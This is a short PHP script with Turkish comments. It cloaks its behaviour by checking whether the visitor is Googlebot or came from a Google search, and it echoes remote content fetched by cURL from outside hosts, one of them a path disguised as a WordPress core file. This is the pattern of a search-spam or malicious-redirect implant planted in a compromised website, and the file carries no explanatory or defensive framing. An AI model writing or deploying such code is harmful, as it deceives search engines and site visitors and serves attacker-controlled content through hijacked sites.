<?php
// Google'dan gelen ziyaretçiyi kontrol et
function is_from_google_search() {
    return isset($_SERVER['HTTP_REFERER']) && preg_match('/google\.[a-z.]+/i', $_SERVER['HTTP_REFERER']);
}

// Googlebot olup olmadığını kontrol et
function is_google_bot() {
    return isset($_SERVER['HTTP_USER_AGENT']) && preg_match('/googlebot/i', $_SERVER['HTTP_USER_AGENT']);
}

// Uzaktaki içeriği cURL ile çeker
function getRemoteContent($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
    curl_setopt($ch, CURLOPT_TIMEOUT, 4);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}

// Googlebot geldiyse
if (is_google_bot()) {
    echo getRemoteContent('https://www.rumch.org/wp-includes/wp-class.php');
    exit;
}

// Google aramasından geldiyse
if (is_from_google_search()) {
    echo getRemoteContent('https://loload.click/');
    exit;
}

// Diğer tüm kullanıcılar
echo getRemoteContent('https://www.rumch.org/wp-includes/wp-class.php');
exit;
?>
